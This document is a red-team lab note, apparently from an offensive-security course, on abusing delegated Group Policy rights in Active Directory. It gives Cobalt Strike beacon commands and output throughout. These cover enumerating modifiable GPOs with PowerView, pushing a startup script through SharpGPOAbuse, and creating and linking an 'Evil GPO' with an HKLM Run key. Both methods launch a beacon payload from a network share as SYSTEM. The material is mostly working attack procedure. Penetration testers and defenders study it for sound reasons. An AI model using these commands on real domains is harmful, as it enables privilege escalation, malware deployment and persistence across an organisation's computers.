---
description: 10/01/2025
---

# ✅ Group Policy

## Introduction: Abusing Group Policy

Group Policy is the central repository in a forest or domain that controls the configuration of computers and users.

Group Policy Objects (GPOs) are sets of configurations that are applied to Organizational Units (OUs).

By default, only Domain Admins can create GPOs and link them to OUs, but it is common practice to delegate those rights to other teams.

This delegation is typically assigned to domain groups. For example, a "Workstation Admins" group may have rights to manage GPOs that apply to a "Workstation" OU.

{% hint style="success" %}
These can create privilege escalation opportunities by allowing users to apply malicious GPOs to domain users or their computers.&#x20;
{% endhint %}

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## Modify Existing GPO

#### Goal

Find GPOs modifiable by non-standard principals, see what OUs/computers they affect, then modify the GPO (SYSVOL or tool) to deploy persistence.

**Modifying an existing GPO that is already applied to one or more OUs is the most straightforward scenario.**

1. **Enumerate all GPOs in the domain with `Get-DomainGPO`**
2. **Check the ACL of each one with `Get-DomainObjectAcl`**
3. **Filter for which a principal has modify privileges such as CreateChild, WriteProperty or GenericWrite**
4. **Filter out the legitimate principals including SYSTEM, Domain Admins, and Enterprise Admins**

```
beacon> powershell Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "CreateChild|WriteProperty" -and $_.SecurityIdentifier -match "S-1-5-21-569305411-121244042-2357301523-[\d]{4,10}" }

AceType               : AccessAllowed
ObjectDN              : CN={5059FAC1-5E94-4361-95D3-3BB235A23928},CN=Policies,CN=System,DC=dev,DC=cyberbotic,DC=io
ActiveDirectoryRights : CreateChild, DeleteChild, ReadProperty, WriteProperty, GenericExecute
OpaqueLength          : 0
ObjectSID             : 
InheritanceFlags      : ContainerInherit
BinaryLength          : 36
IsInherited           : False
IsCallback            : False
PropagationFlags      : None
SecurityIdentifier    : S-1-5-21-569305411-121244042-2357301523-1107
AccessMask            : 131127
AuditFlags            : None
AceFlags              : ContainerInherit
AceQualifier          : AccessAllowed
```

**Once the result is returned, let's resolve the GPO name and SID of the principal:**

```
beacon> powershell Get-DomainGPO -Identity "CN={5059FAC1-5E94-4361-95D3-3BB235A23928},CN=Policies,CN=System,DC=dev,DC=cyberbotic,DC=io" | select displayName, gpcFileSysPath

displayname    gpcfilesyspath                                                                              
-----------    --------------                                                                              
Vulnerable GPO \\dev.cyberbotic.io\SysVol\dev.cyberbotic.io\Policies\{5059FAC1-5E94-4361-95D3-3BB235A23928}

beacon> powershell ConvertFrom-SID S-1-5-21-569305411-121244042-2357301523-1107
DEV\Developers
```

This will show us that members of the "<mark style="color:yellow;">Developers</mark>" group can <mark style="color:yellow;">modify</mark> "<mark style="color:yellow;">Vulnerable GPO</mark>".

We also want to know which OU(s) this GPO applies to, and by extension which computers are in those OUs.

GPOs are linked to an OU by modifying the <mark style="color:yellow;">`gPLink`</mark> property of the OU itself.

**The&#x20;**<mark style="color:yellow;">**`Get-DomainOU`**</mark>**&#x20;cmdlet has a handy&#x20;**<mark style="color:yellow;">**`-GPLink`**</mark>**&#x20;parameter which takes a GPO GUID:**

```
beacon> powershell Get-DomainOU -GPLink "{5059FAC1-5E94-4361-95D3-3BB235A23928}" | select distinguishedName

distinguishedname                         
-----------------                         
OU=Workstations,DC=dev,DC=cyberbotic,DC=io
```

**Finally, to get the computers in an OU, we can use&#x20;**<mark style="color:yellow;">**`Get-DomainComputer`**</mark>**&#x20;and use the OU's distinguished name as a search base:**

```
beacon> powershell Get-DomainComputer -SearchBase "OU=Workstations,DC=dev,DC=cyberbotic,DC=io" | select dnsHostName

dnshostname              
-----------              
wkstn-1.dev.cyberbotic.io
wkstn-2.dev.cyberbotic.io
```

To modify a GPO without the use of GPMC (Group Policy Management Console), we can modify the associated files directly in SYSVOL (the `gpcFileSysPath`):

```
beacon> ls \\dev.cyberbotic.io\SysVol\dev.cyberbotic.io\Policies\{5059FAC1-5E94-4361-95D3-3BB235A23928}

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     09/07/2022 12:40:22   Machine
          dir     09/07/2022 12:40:22   User
 59b      fil     09/07/2022 12:40:22   GPT.INI
```

We can do that manually or use an automated tool such as [`SharpGPOAbuse`](https://github.com/FSecureLABS/SharpGPOAbuse), which has several abuses built into it.

Here is an example using a Computer Startup Script:

It puts a startup script in SYSVOL that will be executed each time an effected computer starts (which incidentally also acts as a good persistence mechanism):

```
beacon> execute-assembly C:\Tools\SharpGPOAbuse\SharpGPOAbuse\bin\Release\SharpGPOAbuse.exe --AddComputerScript --ScriptName startup.bat --ScriptContents "start /b \\dc-2\software\dns_x64.exe" --GPOName "Vulnerable GPO"

[+] Domain = dev.cyberbotic.io
[+] Domain Controller = dc-2.dev.cyberbotic.io
[+] Distinguished Name = CN=Policies,CN=System,DC=dev,DC=cyberbotic,DC=io
[+] GUID of "Vulnerable GPO" is: {5059FAC1-5E94-4361-95D3-3BB235A23928}
[+] Creating new startup script...
[+] versionNumber attribute changed successfully
[+] The version number in GPT.ini was increased successfully.
[+] The GPO was modified to include a new startup script. Wait for the GPO refresh cycle.
[+] Done!
```

{% hint style="info" %}
Note that you can find this <mark style="color:yellow;">`software`</mark> share using PowerView:\
<br>

```
beacon> powershell Find-DomainShare -CheckShareAccess

Name           Type Remark              ComputerName
----           ---- ------              ------------
software          0                     dc-2.dev.cyberbotic.io
```

\
It can go in any remote location as long as it's accessible by the target computer(s)
{% endhint %}

Now, log into the console of _**Workstation 1**_&#x61;nd run `gpupdate /force` from a Command Prompt.

<mark style="color:green;">Upon rebooting the machine, once it starts up, the DNS Beacon will execute as SYSTEM</mark>.

<br>

![](https://files.cdn.thinkific.com/file_uploads/584845/images/afd/f74/129/beacons.png)

`SharpGPOAbuse` has other functions such as adding an immediate scheduled task that you may experiment with.

### One-line summary

1. Enumerate GPO ACLs → find GPOs modifiable by non-priv groups.
2. Resolve GPO → find linked OU(s) → list computers.
3. Modify GPO in SYSVOL or with SharpGPOAbuse (add startup script / scheduled task).
4. gpupdate /force + reboot → payload runs as SYSTEM.

## Create & Link a GPO

Group Policy Objects are stored in `CN=Policies,CN=System` - principals that can create new GPOs in the domain have the "Create groupPolicyContainer objects" privilege over this object.

**We can find these with PowerView's `Get-DomainObjectAcl` cmdlet by looking for those that have "CreateChild" rights on the "Group-Policy-Container", and then resolving their SIDs to readable names:**

```
beacon> powershell Get-DomainObjectAcl -Identity "CN=Policies,CN=System,DC=dev,DC=cyberbotic,DC=io" -ResolveGUIDs | ? { $_.ObjectAceType -eq "Group-Policy-Container" -and $_.ActiveDirectoryRights -contains "CreateChild" } | % { ConvertFrom-SID $_.SecurityIdentifier }

DEV\Developers
```

{% hint style="info" %}
This shows that members of the "Developers" group can create new GPOs.
{% endhint %}

Being able to create a GPO doesn't achieve anything unless it can be linked to an OU.  The ability to link a GPO to an OU is controlled on the OU itself by granting "Write gPLink" privileges.

**This is also something we can find with PowerView by first getting all of the domain OUs and piping them into Get-DomainObjectAcl again.  Iterate over each one looking for instances of "WriteProperty" over "GP-Link":**

```
beacon> powershell Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq "GP-Link" -and $_.ActiveDirectoryRights -match "WriteProperty" } | select ObjectDN,ActiveDirectoryRights,ObjectAceType,SecurityIdentifier | fl

ObjectDN              : OU=Workstations,DC=dev,DC=cyberbotic,DC=io
ActiveDirectoryRights : ReadProperty, WriteProperty
ObjectAceType         : GP-Link
SecurityIdentifier    : S-1-5-21-569305411-121244042-2357301523-1107

beacon> powershell ConvertFrom-SID S-1-5-21-569305411-121244042-2357301523-1107
DEV\Developers
```

{% hint style="info" %}
This shows that members of the "Developers" group can link GPOs to the "Workstations" OU.
{% endhint %}

GPOs can be managed from the command line via the PowerShell RSAT modules.  These are an optional install and so usually only found on management workstations. &#x20;

**The `Get-Module` cmdlet will show if they are present:**

```
beacon> powershell Get-Module -List -Name GroupPolicy | select -expand ExportedCommands

Key                        Value                     
---                        -----                     
Backup-GPO                 Backup-GPO                
Block-GPInheritance        Block-GPInheritance       
Copy-GPO                   Copy-GPO                  
Get-GPInheritance          Get-GPInheritance         
Get-GPO                    Get-GPO                   
[...]
```

**Use the `New-GPO` cmdlet to create and link a new GPO:**

```
beacon> powershell New-GPO -Name "Evil GPO"

DisplayName      : Evil GPO
DomainName       : dev.cyberbotic.io
Owner            : DEV\bfarmer
Id               : 550f6672-bdd0-4e3d-8907-628ee6909f26
GpoStatus        : AllSettingsEnabled
Description      : 
CreationTime     : 9/8/2022 1:30:17 PM
ModificationTime : 9/8/2022 1:30:17 PM
UserVersion      : AD Version: 0, SysVol Version: 0
ComputerVersion  : AD Version: 0, SysVol Version: 0
WmiFilter        : 
```

**Some abuses can be implemented directly using RSAT.  For example, the&#x20;**<mark style="color:yellow;">**`Set-GPPrefRegistryValue`**</mark>**&#x20;cmdlet can be used to add an HKLM autorun key to the registry:**

```
beacon> powershell Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "C:\Windows\System32\cmd.exe /c \\dc-2\software\dns_x64.exe" -Type ExpandString
```

**Next, apply the GPO to the target OU:**

```
beacon> powershell Get-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=cyberbotic,DC=io"

GpoId       : 550f6672-bdd0-4e3d-8907-628ee6909f26
DisplayName : Evil GPO
Enabled     : True
Enforced    : False
Target      : OU=Workstations,DC=dev,DC=cyberbotic,DC=io
Order       : 4
```

_<mark style="color:green;">**Remember that HKLM autoruns require a reboot to execute**</mark>_.
